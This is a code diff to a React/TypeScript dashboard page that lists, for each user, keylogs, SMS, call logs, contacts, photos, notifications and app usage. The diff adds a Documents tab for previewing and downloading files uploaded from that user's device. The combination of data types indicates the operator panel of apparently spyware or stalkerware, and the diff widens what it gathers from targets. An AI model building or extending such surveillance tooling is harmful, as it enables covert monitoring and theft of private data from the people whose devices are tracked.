@@ -5,6 +5,7 @@ import {
   IconBell,
   IconContact,
   IconDevice,
+  IconDocument,
   IconEye,
   IconEyeOff,
   IconImage,
@@ -42,7 +43,8 @@ type Tab =
   | "notifications"
   | "keylogs"
   | "app_usage"
-  | "gallery";
+  | "gallery"
+  | "documents";
 
 const PAGE_SIZE = 40;
 
@@ -143,10 +145,12 @@ export default function UserDetailPage() {
       keylogs: countMap(data?.keylogs),
       app_usage: countMap(data?.app_usage),
       gallery: countMap(data?.gallery),
+      documents: countMap(data?.documents),
     };
     return [
       { id: "app_usage" as Tab, label: "App usage", count: counts.app_usage, icon: IconDevice },
       { id: "gallery" as Tab, label: "Gallery", count: counts.gallery, icon: IconImage },
+      { id: "documents" as Tab, label: "Documents", count: counts.documents, icon: IconDocument },
       { id: "sms" as Tab, label: "SMS", count: counts.sms, icon: IconMessage },
       { id: "call_logs" as Tab, label: "Calls", count: counts.call_logs, icon: IconPhone },
       { id: "contacts" as Tab, label: "Contacts", count: counts.contacts, icon: IconContact },
@@ -167,6 +171,7 @@ export default function UserDetailPage() {
       return recordsToList(data.notifications).filter((r) => matchesQuery(r, q));
     if (tab === "keylogs") return recordsToList(data.keylogs).filter((r) => matchesQuery(r, q));
     if (tab === "app_usage") return recordsToList(data.app_usage).filter((r) => matchesQuery(r, q));
+    if (tab === "documents") return recordsToList(data.documents).filter((r) => matchesQuery(r, q));
     return [];
   }, [data, tab, query]);
 
@@ -382,6 +387,16 @@ export default function UserDetailPage() {
                 render: (r) => formatTime(r.lastTimeUsed || r.uploadedAt),
               },
             ]}
+          />
+        ) : null}
+
+        {tab === "documents" ? (
+          <DocumentsView
+            rows={pageRows}
+            total={listRecords.length}
+            page={pageSafe}
+            pageCount={pageCount}
+            onPage={setPage}
           />
         ) : null}
 
@@ -777,6 +792,96 @@ function MessageFeed({
             <p className="feed-body">{renderBody(r)}</p>
           </article>
         ))}
+      </div>
+    </div>
+  );
+}
+
+function DocumentsView({
+  rows,
+  total,
+  page,
+  pageCount,
+  onPage,
+}: {
+  rows: Record<string, any>[];
+  total: number;
+  page: number;
+  pageCount: number;
+  onPage: (p: number) => void;
+}) {
+  if (total === 0) {
+    return (
+      <p className="empty-state">No documents uploaded yet.</p>
+    );
+  }
+
+  const from = page * PAGE_SIZE + 1;
+  const to = Math.min(total, page * PAGE_SIZE + rows.length);
+
+  return (
+    <div className="stack">
+      <Pager from={from} to={to} total={total} page={page} pageCount={pageCount} onPage={onPage} />
+      <div className="table-wrap">
+        <table className="table">
+          <thead>
+            <tr>
+              <th>File Name</th>
+              <th>Size</th>
+              <th>Uploaded</th>
+              <th>Action</th>
+            </tr>
+          </thead>
+          <tbody>
+            {rows.map((doc: any) => {
+              const fileName = doc.fileName || doc.id || "Document";
+              const fileSize = doc.fileSize ? `${(Number(doc.fileSize) / 1024 / 1024).toFixed(2)} MB` : "—";
+              const uploadedTime = formatTime(doc.uploadedAt || doc.timestamp);
+              const isPdf = fileName.toLowerCase().endsWith('.pdf');
+              const isImage = /\.(jpg|jpeg|png|gif|webp)$/i.test(fileName);
+
+              return (
+                <tr key={doc.id} className="click-row">
+                  <td>
+                    <strong>{fileName}</strong>
+                  </td>
+                  <td>{fileSize}</td>
+                  <td className="muted tiny">{uploadedTime}</td>
+                  <td>
+                    {doc.url ? (
+                      <>
+                        {isPdf || isImage ? (
+                          <a
+                            href={doc.url}
+                            target="_blank"
+                            rel="noreferrer"
+                            className="btn btn-icon"
+                            style={{ padding: "6px 12px", fontSize: "12px" }}
+                          >
+                            👁️ Preview
+                          </a>
+                        ) : (
+                          <a
+                            href={doc.url}
+                            target="_blank"
+                            rel="noreferrer"
+                            className="btn btn-icon secondary"
+                            download
+                            style={{ padding: "6px 12px", fontSize: "12px" }}
+                          >
+                            ⬇️ Download
+                          </a>
+                        )}
+                      </>
+                    ) : (
+                      "—"
+                    )}
+                  </td>
+                </tr>
+              );
+            })}
+          </tbody>
+        </table>
       </div>
     </div>
   );
